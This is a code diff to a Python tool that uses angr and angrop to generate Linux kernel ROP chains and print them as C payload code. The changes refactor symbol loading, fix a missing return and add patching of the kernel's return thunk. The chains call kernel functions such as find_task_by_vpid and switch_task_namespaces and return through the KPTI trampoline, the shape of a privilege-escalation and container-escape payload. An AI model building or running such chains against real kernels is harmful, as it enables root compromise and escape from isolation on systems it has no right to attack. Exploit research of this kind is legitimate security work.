@@ -5,7 +5,10 @@ import angrop
 import argparse
 import os
 import subprocess
-import re
+
+from rop_util import load_symbols
+from angrop.rop_gadget import RopGadget
+from rop_ret_patcher import patch_vmlinux_return_thunk
 
 BIT_SIZE = 64
 PREPARE_KERNEL_CRED = "prepare_kernel_cred"
@@ -29,8 +32,8 @@ class RopGeneratorAngrop:
 
     def __init__(self, vmlinux_path) -> None:
         self._vmlinux_path = vmlinux_path
-        self._project = angr.Project(vmlinux_path)
-        self._symbol_map = self._load_symbols()
+        self._project = angr.Project(vmlinux_path, perform_relocations=False)
+        self._symbol_map = load_symbols(vmlinux_path)
         self._addr_to_symbol = {addr: name for name,
                                 addr in self._symbol_map.items()}
         # vmlinux is not marked PIE but we want the rebase option in angrop turned on
@@ -41,33 +44,11 @@ class RopGeneratorAngrop:
         self._kpti_trampoline = self._find_kpti_trampoline()
         self._rop = self._load_angrop()
 
-    def _load_symbols(self):
-        # Run nm command to get symbol information
-        result = subprocess.run(
-            ["nm", self._vmlinux_path],
-            capture_output=True,
-            text=True,
-            check=True,
-        )
-
-        # Parse nm output
-        symbols = {}
-        for line in result.stdout.splitlines():
-            # Example line: "ffffffff81000000 t _stext"
-            match = re.match(r"([0-9a-fA-F]+) . (.+)", line)
-            if match:
-                address_str, name = match.groups()
-                # Convert hex address to integer
-                address = int(address_str, 16)
-                symbols[name] = address
-
-        return symbols
-
     def _find_symbol_addr(self, func_name):
         return self._symbol_map.get(func_name)
 
     def _find_symbol_name(self, addr):
-        self._addr_to_symbol.get(addr)
+        return self._addr_to_symbol.get(addr)
 
     def _load_angrop(self):
         rop = self._project.analyses.ROP(kernel_mode=True, fast_mode=True)
@@ -85,12 +66,11 @@ class RopGeneratorAngrop:
         chain += self._rop.func_call(
             self._find_symbol_addr(FIND_TASK_BY_VPID), [1])
         chain += self._rop.move_regs(rdi="rax")
-        # parse_mount_options has reference to init_nsproxy
         chain += self._rop.set_regs(self._find_symbol_addr(INIT_NSPROXY),
                                     preserve_regs=("rdi",))
         chain += self._rop.func_call(
             self._find_symbol_addr(SWITCH_TASK_NAMESPACES), [])
-        chain += self._rop.func_call(self._kpti_trampoline, [])
+        chain.add_gadget(RopGadget(self._kpti_trampoline))
         chain.add_value(0)
         chain.add_value(0)
         return chain
@@ -164,7 +144,8 @@ if __name__ == "__main__":
         description="Generates ROP payloads for linux kernel images")
     parser.add_argument("vmlinux", help="Path to vmlinux file")
     args = parser.parse_args()
-    rop_generator = RopGeneratorAngrop(args.vmlinux)
+    patched_vmlinux_path = patch_vmlinux_return_thunk(args.vmlinux)
+    rop_generator = RopGeneratorAngrop(patched_vmlinux_path)
     chain = rop_generator.build_rop_chain()
     payload_code = rop_generator.payload_c_code(chain)
     print(payload_code)
